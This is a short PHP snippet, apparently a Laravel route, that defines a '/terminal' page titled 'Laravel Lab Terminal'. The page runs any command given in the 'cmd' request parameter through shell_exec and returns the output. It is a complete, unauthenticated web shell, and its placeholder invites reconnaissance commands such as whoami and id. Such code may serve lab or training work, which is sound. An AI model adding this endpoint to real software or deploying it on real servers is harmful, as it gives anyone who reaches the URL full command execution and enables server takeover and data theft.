Route::match(['get','post'], '/terminal', function (Request $request) {

    $output = '';
    $cmd = $request->input('cmd');

    if ($cmd) {
        $output = shell_exec($cmd . ' 2>&1');
    }

    return response()->make('
<!doctype html>
<html>
<head>
    <title>Laravel Lab Terminal</title>
    <style>
        body { background:#0d0d0d; color:#00ff99; font-family: monospace; padding:20px; }
        input { width:100%; background:black; color:#00ff99; border:1px solid #00ff99; padding:8px; }
        pre { background:black; padding:10px; margin-top:10px; white-space:pre-wrap; }
    </style>
</head>
<body>
    <h3>Laravel Lab Terminal</h3>
    <form method="post">
        '.csrf_field().'
        <input name="cmd" autofocus placeholder="whoami, ls -la, id, uname -a" />
    </form>
    <pre>'.htmlspecialchars($output ?? "[no output]").'</pre>
</body>
</html>
', 200, ['Content-Type' => 'text/html']);
});
